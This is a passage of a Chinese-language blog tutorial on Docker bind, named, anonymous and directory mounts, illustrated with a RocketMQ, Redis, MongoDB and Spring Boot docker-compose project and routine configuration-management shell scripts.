                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在 Docker 容器化部署中，数据持久化是至关重要的一环。本文基于您提供的 docker-compose.yml 文件和实际项目场景，详细解析四种主要的 Docker 挂载方式：<strong>绑定挂载</strong>、<strong>命名卷挂载</strong>、<strong>匿名卷挂载</strong>和<strong>目录挂载</strong>，并通过 RocketMQ 微服务项目进行实战演示。</p>
<h2 data-id="heading-0">一、四种挂载方式概述</h2>
<h3 data-id="heading-1">1.1 核心概念对比</h3>








































<table><thead><tr><th>挂载类型</th><th>管理方式</th><th>持久化</th><th>可见性</th><th>适用场景</th></tr></thead><tbody><tr><td><strong>绑定挂载</strong>​</td><td>用户管理</td><td>是</td><td>宿主机可见</td><td>配置文件、开发环境</td></tr><tr><td><strong>命名卷挂载</strong>​</td><td>Docker 管理</td><td>是</td><td>Docker 管理</td><td>数据库数据、生产环境</td></tr><tr><td><strong>匿名卷挂载</strong>​</td><td>Docker 自动</td><td>临时</td><td>隐藏</td><td>缓存、临时数据</td></tr><tr><td><strong>目录挂载</strong>​</td><td>用户管理</td><td>是</td><td>宿主机可见</td><td>日志、共享数据</td></tr></tbody></table>
<h3 data-id="heading-2">1.2 在项目中的实际应用</h3>
<p>根据您的 docker-compose.yml 文件：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># 绑定挂载 - 配置文件（重点分析）</span>
<span class="hljs-attr">rmqbroker:</span>
  <span class="hljs-attr">volumes:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">./broker.conf:/opt/rocketmq/conf/broker.conf</span>

<span class="hljs-comment"># 命名卷挂载 - 数据库数据</span>
<span class="hljs-attr">redis:</span>
  <span class="hljs-attr">volumes:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">redis_data:/data</span>
<span class="hljs-attr">mongo:</span>
  <span class="hljs-attr">volumes:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">mongo_data:/data/db</span>

<span class="hljs-comment"># 目录挂载 - 应用日志</span>
<span class="hljs-attr">my-springboot-app:</span>
  <span class="hljs-attr">volumes:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">./logs:/home/spring/logs</span>

<span class="hljs-comment"># 匿名卷挂载 - rmqnamesrv（无显式配置）</span>
</code></pre>
<h2 data-id="heading-3">二、绑定挂载 (Bind Mounts) 深度解析：配置管理的终极解决方案</h2>
<h3 data-id="heading-4">2.1 技术原理与四大核心优势</h3>
<p>绑定挂载是<strong>直接将宿主机文件系统路径映射到容器内部</strong>的挂载方式。</p>
<h4 data-id="heading-5">✅ 配置外部化 - 配置与镜像分离</h4>
<pre><code class="hljs language-bash" lang="bash">rmqbroker:
  volumes:
    - ./broker.conf:/opt/rocketmq/conf/broker.conf
</code></pre>
<p><strong>实现原理：</strong></p>
<ul>
<li>配置文件完全独立于 Docker 镜像</li>
<li>镜像保持纯净，不包含环境特定配置</li>
<li>同一镜像可适配不同环境（开发、测试、生产）</li>
</ul>
<p><strong>实战价值：</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 不同环境使用不同配置</span>
config/
├── dev/
│   └── broker.conf    <span class="hljs-comment"># 开发环境配置</span>
├── <span class="hljs-built_in">test</span>/
│   └── broker.conf    <span class="hljs-comment"># 测试环境配置</span>
└── prod/
    └── broker.conf    <span class="hljs-comment"># 生产环境配置</span>

<span class="hljs-comment"># 通过环境变量切换配置</span>
docker compose -f docker-compose.yml -f docker-compose.dev.yml up
</code></pre>
<h4 data-id="heading-6">✅ 实时编辑 - 宿主机修改立即生效</h4>
<p><strong>技术实现：</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. 宿主机编辑配置文件</span>
vim broker.conf
<span class="hljs-comment"># 修改：brokerRole = SYNC_MASTER</span>

<span class="hljs-comment"># 2. 容器内实时同步（无需重启）</span>
docker compose <span class="hljs-built_in">exec</span> rmqbroker <span class="hljs-built_in">cat</span> /opt/rocketmq/conf/broker.conf
<span class="hljs-comment"># 立即看到：brokerRole = SYNC_MASTER</span>

<span class="hljs-comment"># 3. 热重载配置（部分服务支持）</span>
docker compose <span class="hljs-built_in">exec</span> rmqbroker sh -c <span class="hljs-string">"kill -HUP 1"</span>
</code></pre>
<p><strong>开发效率提升：</strong></p>
<ul>
<li>开发阶段：避免重复构建镜像</li>
<li>调试阶段：快速验证配置变更</li>
<li>运维阶段：紧急配置修复</li>
</ul>
<h4 data-id="heading-7">✅ 版本控制 - 配置文件可纳入 Git 管理</h4>
<p><strong>Git 集成方案：</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 配置文件纳入版本控制</span>
git add broker.conf docker-compose.yml
git commit -m <span class="hljs-string">"feat: update rocketmq broker configuration"</span>

<span class="hljs-comment"># 配置变更追踪</span>
git <span class="hljs-built_in">log</span> --oneline --follow broker.conf
<span class="hljs-comment"># 输出：a1b2c3d 优化Broker内存配置</span>
<span class="hljs-comment">#       e4f5g6h 初始Broker配置</span>

<span class="hljs-comment"># 分支策略管理</span>
git checkout feature/new-cluster
<span class="hljs-comment"># 修改配置测试新功能</span>
</code></pre>
<p><strong>.gitignore 配置示例：</strong></p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># 忽略生成的文件</span>
<span class="hljs-string">logs/</span>
<span class="hljs-string">data/</span>
<span class="hljs-string">tmp/</span>

<span class="hljs-comment"># 保留配置文件</span>
<span class="hljs-type">!broker.conf</span>
<span class="hljs-type">!application.yml</span>

<span class="hljs-comment"># 忽略本地覆盖配置</span>
<span class="hljs-string">broker.conf.local</span>
<span class="hljs-string">application-*.yml</span>
</code></pre>
<h4 data-id="heading-8">✅ 环境适配 - 不同环境使用不同配置</h4>
<p><strong>多环境配置管理：</strong></p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># docker-compose.override.yml（开发环境）</span>
<span class="hljs-attr">version:</span> <span class="hljs-string">'3.8'</span>
<span class="hljs-attr">services:</span>
  <span class="hljs-attr">rmqbroker:</span>
    <span class="hljs-attr">volumes:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">./config/dev/broker.conf:/opt/rocketmq/conf/broker.conf</span>
    <span class="hljs-attr">environment:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">JAVA_OPTS=-Xmx512m</span> <span class="hljs-string">-Xms512m</span>

<span class="hljs-comment"># docker-compose.prod.yml（生产环境）</span>
<span class="hljs-attr">version:</span> <span class="hljs-string">'3.8'</span>
<span class="hljs-attr">services:</span>
  <span class="hljs-attr">rmqbroker:</span>
    <span class="hljs-attr">volumes:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">./config/prod/broker.conf:/opt/rocketmq/conf/broker.conf</span>
    <span class="hljs-attr">environment:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">JAVA_OPTS=-Xmx2g</span> <span class="hljs-string">-Xms2g</span>
</code></pre>
<p><strong>环境特定配置示例：</strong></p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># config/dev/broker.conf（开发环境）</span>
<span class="hljs-attr">brokerRole</span> = ASYNC_MASTER
<span class="hljs-attr">flushDiskType</span> = ASYNC_FLUSH
<span class="hljs-attr">autoCreateTopicEnable</span> = <span class="hljs-literal">true</span>

<span class="hljs-comment"># config/prod/broker.conf（生产环境）  </span>
<span class="hljs-attr">brokerRole</span> = SYNC_MASTER
<span class="hljs-attr">flushDiskType</span> = SYNC_FLUSH
<span class="hljs-attr">autoCreateTopicEnable</span> = <span class="hljs-literal">false</span>
</code></pre>
<h3 data-id="heading-9">2.2 项目实战：RocketMQ Broker 配置绑定的完整工作流</h3>
<p><strong>broker.conf 配置文件内容：</strong></p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># RocketMQ Broker 配置 - 外部化配置示例</span>
<span class="hljs-attr">brokerClusterName</span> = <span class="hljs-variable">${CLUSTER_NAME:-DefaultCluster}</span>
<span class="hljs-attr">brokerName</span> = broker-<span class="hljs-variable">${BROKER_ID:-a}</span>
<span class="hljs-attr">brokerId</span> = <span class="hljs-variable">${BROKER_ID:-0}</span>

<span class="hljs-comment"># 消息存储配置</span>
<span class="hljs-attr">deleteWhen</span> = <span class="hljs-number">04</span>
<span class="hljs-attr">fileReservedTime</span> = <span class="hljs-number">48</span>
<span class="hljs-attr">mapedFileSizeCommitLog</span> = <span class="hljs-number">1073741824</span>

<span class="hljs-comment"># 高可用配置</span>
<span class="hljs-attr">brokerRole</span> = <span class="hljs-variable">${BROKER_ROLE:-ASYNC_MASTER}</span>
<span class="hljs-attr">flushDiskType</span> = <span class="hljs-variable">${FLUSH_DISK_TYPE:-ASYNC_FLUSH}</span>

<span class="hljs-comment"># 开发环境特供</span>
<span class="hljs-attr">autoCreateTopicEnable</span> = <span class="hljs-variable">${AUTO_CREATE_TOPIC:-true}</span>
<span class="hljs-attr">autoCreateSubscriptionGroup</span> = <span class="hljs-variable">${AUTO_CREATE_SUBSCRIPTION:-true}</span>

<span class="hljs-comment"># 动态获取NameServer地址</span>
<span class="hljs-attr">namesrvAddr</span> = <span class="hljs-variable">${NAMESRV_ADDR:-rmqnamesrv:9876}</span>
</code></pre>
<p><strong>完整的配置管理流水线：</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># config-pipeline.sh - 配置管理完整工作流</span>

<span class="hljs-comment"># 1. 配置验证</span>
<span class="hljs-function"><span class="hljs-title">validate_config</span></span>() {
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"🔍 验证配置文件语法..."</span>
    docker compose config -q
    <span class="hljs-keyword">if</span> [ $? -eq 0 ]; <span class="hljs-keyword">then</span>
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"✅ 配置文件语法正确"</span>
    <span class="hljs-keyword">else</span>
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"❌ 配置文件存在错误"</span>
        <span class="hljs-built_in">exit</span> 1
    <span class="hljs-keyword">fi</span>
}

<span class="hljs-comment"># 2. 配置差异化检查</span>
<span class="hljs-function"><span class="hljs-title">check_config_diff</span></span>() {
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"📊 检查配置变更..."</span>
    <span class="hljs-keyword">if</span> [ -f <span class="hljs-string">"broker.conf.last"</span> ]; <span class="hljs-keyword">then</span>
        diff -u broker.conf.last broker.conf || <span class="hljs-literal">true</span>
    <span class="hljs-keyword">fi</span>
    <span class="hljs-built_in">cp</span> broker.conf broker.conf.last
}

<span class="hljs-comment"># 3. 安全扫描</span>
<span class="hljs-function"><span class="hljs-title">security_scan</span></span>() {
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"🔒 配置文件安全扫描..."</span>
    <span class="hljs-comment"># 检查敏感信息</span>
    <span class="hljs-keyword">if</span> grep -q <span class="hljs-string">"password|secret|key"</span> broker.conf; <span class="hljs-keyword">then</span>
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"⚠️  发现可能的敏感信息，请确认已脱敏"</span>
    <span class="hljs-keyword">fi</span>
}

<span class="hljs-comment"># 4. 配置部署</span>
<span class="hljs-function"><span class="hljs-title">deploy_config</span></span>() {
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"🚀 部署配置文件..."</span>
    docker compose restart rmqbroker
    <span class="hljs-built_in">sleep</span> 5
    docker compose logs rmqbroker --<span class="hljs-built_in">tail</span>=20
}

<span class="hljs-comment"># 执行完整流水线</span>
validate_config
check_config_diff  
security_scan
deploy_config
</code></pre>
<h3 data-id="heading-10">2.3 配置绑定的高级特性</h3>
<h4 data-id="heading-11">配置模板与变量替换</h4>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 使用 envsubst 进行配置模板化</span>
cat &gt; broker.conf.template &lt;&lt; 'EOF'
<span class="hljs-attr">brokerClusterName</span> = <span class="hljs-variable">${CLUSTER_NAME}</span>
<span class="hljs-attr">brokerName</span> = broker-<span class="hljs-variable">${BROKER_ID}</span>
<span class="hljs-attr">namesrvAddr</span> = <span class="hljs-variable">${NAMESRV_ADDR}</span>
EOF

<span class="hljs-comment"># 生成环境特定配置</span>
export <span class="hljs-attr">CLUSTER_NAME</span>=ProductionCluster
export <span class="hljs-attr">BROKER_ID</span>=a
export <span class="hljs-attr">NAMESRV_ADDR</span>=rmqnamesrv:<span class="hljs-number">9876</span>

envsubst &lt; broker.conf.template &gt; broker.conf
</code></pre>
<h4 data-id="heading-12">配置加密与安全</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 使用 ansible-vault 加密敏感配置</span>
ansible-vault encrypt broker-secrets.conf

<span class="hljs-comment"># 在 CI/CD 中解密</span>
<span class="hljs-built_in">echo</span> <span class="hljs-variable">$VAULT_PASSWORD</span> | ansible-vault decrypt \
  --output broker.conf \
  broker-secrets.conf
</code></pre>
<h2 data-id="heading-13">三、命名卷挂载 (Named Volumes) 深度解析</h2>
<h3 data-id="heading-14">3.1 技术原理</h3>
<p>命名卷是 <strong>Docker 管理的持久化存储卷</strong>，具有唯一的名称，生命周期独立于容器。</p>
<h3 data-id="heading-15">3.2 项目实战：Redis 和 MongoDB 数据持久化</h3>
<p><strong>配置示例：</strong></p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">redis:</span>
  <span class="hljs-attr">volumes:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">redis_data:/data</span>

<span class="hljs-attr">mongo:</span>
  <span class="hljs-attr">volumes:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">mongo_data:/data/db</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">mongo_config:/data/configdb</span>

<span class="hljs-attr">volumes:</span>
  <span class="hljs-attr">redis_data:</span>
  <span class="hljs-attr">mongo_data:</span>
  <span class="hljs-attr">mongo_config:</span>
</code></pre>
<p><strong>实战操作：</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. 查看命名卷信息</span>
docker volume <span class="hljs-built_in">ls</span>
docker volume inspect rocket-demo_redis_data

<span class="hljs-comment"># 2. 数据持久化验证</span>
<span class="hljs-comment"># 写入测试数据</span>
docker compose <span class="hljs-built_in">exec</span> redis redis-cli -a 123456 <span class="hljs-built_in">set</span> test_key <span class="hljs-string">"hello_redis"</span>

<span class="hljs-comment"># 重启服务验证数据持久化</span>
docker compose restart redis
docker compose <span class="hljs-built_in">exec</span> redis redis-cli -a 123456 get test_key

<span class="hljs-comment"># 3. 备份命名卷数据</span>
docker run --<span class="hljs-built_in">rm</span> -v rocket-demo_redis_data:/source -v $(<span class="hljs-built_in">pwd</span>)/backup:/backup alpine \
  tar czf /backup/redis_backup_$(<span class="hljs-built_in">date</span> +%Y%m%d).tar.gz -C /source .
</code></pre>
<p><strong>命名卷实际路径：</strong></p>
<p>根据您的图片信息，命名卷存储在 Docker 默认路径：</p>
<pre><code class="hljs language-bash" lang="bash">/var/lib/docker/volumes/rocket-demo_redis_data/_data
/var/lib/docker/volumes/rocket-demo_mongo_data/_data
</code></pre>
<h3 data-id="heading-16">3.3 管理命令大全</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 创建命名卷</span>
docker volume create my_volume

<span class="hljs-comment"># 查看卷详情</span>
docker volume inspect volume_name

<span class="hljs-comment"># 备份卷数据</span>
docker run --<span class="hljs-built_in">rm</span> -v volume_name:/source -v $(<span class="hljs-built_in">pwd</span>):/backup alpine \
  tar czf /backup/backup.tar.gz -C /source .

<span class="hljs-comment"># 恢复卷数据</span>
docker run --<span class="hljs-built_in">rm</span> -v volume_name:/target -v $(<span class="hljs-built_in">pwd</span>):/backup alpine \
  tar xzf /backup/backup.tar.gz -C /target

<span class="hljs-comment"># 清理未使用卷</span>
docker volume prune
</code></pre>
<h2 data-id="heading-17">四、匿名卷挂载 (Anonymous Volumes) 深度解析</h2>
<h3 data-id="heading-18">4.1 技术原理</h3>
<p>匿名卷是 <strong>Docker 自动创建和管理的临时卷</strong>，没有指定名称，通常用于容器运行时数据。</p>
<h3 data-id="heading-19">4.2 项目实战：RocketMQ NameServer 的匿名卷</h3>
<p><strong>配置分析：</strong></p>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">rmqnamesrv:</span>
  <span class="hljs-comment"># 没有配置 volumes，使用匿名卷</span>
</code></pre>
<p><strong>根据您的图片信息分析：</strong></p>
<p>从 <code>docker inspect rmqnamesrv</code>输出可以看到，容器使用匿名卷存储运行时数据：</p>
<pre><code class="hljs language-bash" lang="bash">/var/lib/docker/containers/8fbef265e72791e4aa229079f5e5820929546bebd9fd5beabdf53458fbfae99c/
</code></pre>
<p><strong>实战验证：</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. 查看匿名卷挂载点</span>
docker inspect rmqnamesrv | grep -A 10 -B 5 Mounts

<span class="hljs-comment"># 2. 验证数据非持久化</span>
<span class="hljs-comment"># 查看当前存储状态</span>
docker compose <span class="hljs-built_in">exec</span> rmqnamesrv <span class="hljs-built_in">du</span> -sh /home/rocketmq/store

<span class="hljs-comment"># 重启服务（数据可能丢失）</span>
docker compose restart rmqnamesrv
</code></pre>
<h3 data-id="heading-20">4.3 匿名卷的实际路径结构</h3>
<pre><code class="hljs language-ini" lang="ini">/var/lib/docker/containers/<span class="hljs-section">[容器ID]</span>/
├── mounts/           <span class="hljs-comment"># 挂载点目录</span>
├── resolv.conf       <span class="hljs-comment"># DNS配置</span>
├── hosts             <span class="hljs-comment"># 主机文件</span>
├── hostname          <span class="hljs-comment"># 主机名</span>
└── <span class="hljs-section">[容器ID]</span>-json.log <span class="hljs-comment"># 日志文件</span>
</code></pre>
<h2 data-id="heading-21">五、目录挂载 (Directory Mounts) 深度解析</h2>
<h3 data-id="heading-22">5.1 技术原理</h3>
<p>目录挂载是绑定挂载的一种特殊形式，专门用于<strong>挂载整个目录而非单个文件</strong>。</p>
<h3 data-id="heading-23">5.2 项目实战：SpringBoot 应用日志目录</h3>
<p><strong>配置示例：</strong></p>
<pre><code class="hljs language-bash" lang="bash">my-springboot-app:
  volumes:
    - ./logs:/home/spring/logs
</code></pre>
<p><strong>目录结构规划：</strong></p>
<pre><code class="hljs language-lua" lang="lua">rocket-demo/
├── logs/                           # 日志根目录
│   ├── application/               # 应用日志
│   │   ├── springboot-app.<span class="hljs-built_in">log</span>
│   │   └── <span class="hljs-built_in">error</span>.<span class="hljs-built_in">log</span>
│   └── rocketmqlogs/              # RocketMQ 客户端日志
│       ├── rocketmq_client.<span class="hljs-built_in">log</span>
│       └── rocketmq_app.<span class="hljs-built_in">log</span>
└── docker-compose.yml
</code></pre>
<p><strong>实战操作：</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. 创建日志目录结构</span>
<span class="hljs-built_in">mkdir</span> -p logs/application logs/rocketmqlogs
<span class="hljs-built_in">chmod</span> 755 logs logs/application logs/rocketmqlogs

<span class="hljs-comment"># 2. 验证日志写入</span>
docker compose logs my-springboot-app
<span class="hljs-built_in">ls</span> -la logs/application/

<span class="hljs-comment"># 3. 日志轮转配置（在宿主机设置）</span>
<span class="hljs-built_in">cat</span> &gt; /etc/logrotate.d/rocket-demo &lt;&lt; <span class="hljs-string">EOF
/root/rocket-demo/logs/application/*.log {
    daily
    missingok
    rotate 7
    compress
    delaycompress
    notifempty
    copytruncate
}
EOF</span>
</code></pre>
<h3 data-id="heading-24">5.3 权限管理最佳实践</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 设置正确的目录权限</span>
sudo <span class="hljs-built_in">chown</span> -R 1000:1000 logs/    <span class="hljs-comment"># 1000 是容器内应用用户的UID</span>
sudo <span class="hljs-built_in">chmod</span> -R 755 logs/

<span class="hljs-comment"># 在 Dockerfile 中确保用户一致性</span>
<span class="hljs-comment"># FROM openjdk:8-jdk-alpine</span>
<span class="hljs-comment"># RUN adduser -D -u 1000 spring</span>
<span class="hljs-comment"># USER spring</span>
</code></pre>
<h2 data-id="heading-25">六、配置文件绑定的四大优势深度实战</h2>
<h3 data-id="heading-26">6.1 ✅ 配置外部化的企业级实践</h3>
<p><strong>配置中心架构：</strong></p>
<pre><code class="hljs language-csharp" lang="csharp">config-center/
├── <span class="hljs-keyword">base</span>/                 <span class="hljs-meta"># 基础配置</span>
│   ├── broker-<span class="hljs-keyword">base</span>.conf
│   └── application-<span class="hljs-keyword">base</span>.yml
├── environments/         <span class="hljs-meta"># 环境配置</span>
│   ├── dev/
│   ├── test/
│   └── prod/
└── templates/           <span class="hljs-meta"># 配置模板</span>
    └── broker.conf.tpl
</code></pre>
<p><strong>动态配置注入：</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># docker-compose.yml 支持环境变量注入</span>
rmqbroker:
  volumes:
    - ./config/<span class="hljs-variable">${ENV:-dev}</span>/broker.conf:/opt/rocketmq/conf/broker.conf
  environment:
    - ENV=<span class="hljs-variable">${ENV:-dev}</span>
    - CLUSTER_NAME=<span class="hljs-variable">${CLUSTER_NAME:-DefaultCluster}</span>
</code></pre>
<h3 data-id="heading-27">6.2 ✅ 实时编辑的开发效率提升</h3>
<p><strong>开发调试工作流：</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># dev-watch.sh - 开发环境配置监听和热重载</span>

<span class="hljs-comment"># 监听配置文件变化</span>
inotifywait -m -e modify broker.conf |
<span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> path action file; <span class="hljs-keyword">do</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"🔧 检测到配置变更: <span class="hljs-variable">$file</span>"</span>
    
    <span class="hljs-comment"># 验证配置语法</span>
    <span class="hljs-keyword">if</span> docker compose <span class="hljs-built_in">exec</span> rmqbroker <span class="hljs-built_in">test</span> -f /opt/rocketmq/conf/broker.conf; <span class="hljs-keyword">then</span>
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"✅ 配置文件已同步到容器"</span>
        
        <span class="hljs-comment"># 尝试热重载</span>
        docker compose <span class="hljs-built_in">exec</span> rmqbroker sh -c <span class="hljs-string">"pkill -HUP java"</span> 2&gt;/dev/null &amp;&amp; \
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"🔥 配置热重载成功"</span> || \
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"⚠️  需要重启服务使配置生效"</span>
    <span class="hljs-keyword">fi</span>
<span class="hljs-keyword">done</span>
</code></pre>
<h3 data-id="heading-28">6.3 ✅ 版本控制的完整 Git 策略</h3>
<p><strong>Git 分支策略：</strong></p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-meta"># 配置管理的 Git 工作流</span>
git flow feature start broker-config-optimization

<span class="hljs-meta"># 1. 在特性分支修改配置</span>
vim broker.conf
git <span class="hljs-keyword">add</span> broker.conf
git commit -m <span class="hljs-string">"feat: 优化Broker内存配置"</span>

<span class="hljs-meta"># 2. 代码审查后合并</span>
git flow feature finish broker-config-optimization

<span class="hljs-meta"># 3. 标签发布</span>
git tag -a v1<span class="hljs-number">.2</span><span class="hljs-number">.0</span>-config -m <span class="hljs-string">"版本1.2.0配置优化"</span>
</code></pre>
<p><strong>.gitattributes 配置：</strong></p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 配置文件的合并策略</span>
broker.conf <span class="hljs-attr">merge</span>=union
*.conf <span class="hljs-attr">diff</span>=config

<span class="hljs-comment"># 敏感配置模板</span>
broker.conf.example text <span class="hljs-attr">eol</span>=lf
</code></pre>
<h3 data-id="heading-29">6.4 ✅ 环境适配的完整方案</h3>
<p><strong>环境配置矩阵：</strong></p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># config-matrix.yml</span>
<span class="hljs-attr">environments:</span>
  <span class="hljs-attr">dev:</span>
    <span class="hljs-attr">broker_role:</span> <span class="hljs-string">ASYNC_MASTER</span>
    <span class="hljs-attr">auto_create_topic:</span> <span class="hljs-literal">true</span>
    <span class="hljs-attr">memory:</span> <span class="hljs-string">512m</span>
  <span class="hljs-attr">test:</span>
    <span class="hljs-attr">broker_role:</span> <span class="hljs-string">SYNC_MASTER</span>  
    <span class="hljs-attr">auto_create_topic:</span> <span class="hljs-literal">true</span>
    <span class="hljs-attr">memory:</span> <span class="hljs-string">1g</span>
  <span class="hljs-attr">prod:</span>
    <span class="hljs-attr">broker_role:</span> <span class="hljs-string">SYNC_MASTER</span>
    <span class="hljs-attr">auto_create_topic:</span> <span class="hljs-literal">false</span>
    <span class="hljs-attr">memory:</span> <span class="hljs-string">2g</span>
</code></pre>
<p><strong>配置生成脚本：</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># generate-config.sh - 多环境配置生成</span>

ENV=<span class="hljs-variable">${1:-dev}</span>
CONFIG_MATRIX=<span class="hljs-string">"config-matrix.yml"</span>

<span class="hljs-built_in">echo</span> <span class="hljs-string">"生成 <span class="hljs-variable">$ENV</span> 环境配置..."</span>

<span class="hljs-comment"># 从矩阵中提取配置</span>
BROKER_ROLE=$(yq <span class="hljs-built_in">eval</span> <span class="hljs-string">".environments.<span class="hljs-variable">$ENV</span>.broker_role"</span> <span class="hljs-variable">$CONFIG_MATRIX</span>)
AUTO_TOPIC=$(yq <span class="hljs-built_in">eval</span> <span class="hljs-string">".environments.<span class="hljs-variable">$ENV</span>.auto_create_topic"</span> <span class="hljs-variable">$CONFIG_MATRIX</span>)

<span class="hljs-comment"># 生成配置文件</span>
<span class="hljs-built_in">cat</span> &gt; config/<span class="hljs-variable">$ENV</span>/broker.conf &lt;&lt; <span class="hljs-string">EOF
# 自动生成配置 - $ENV 环境
brokerRole = $BROKER_ROLE
autoCreateTopicEnable = $AUTO_TOPIC
flushDiskType = ASYNC_FLUSH
namesrvAddr = rmqnamesrv:9876
EOF</span>

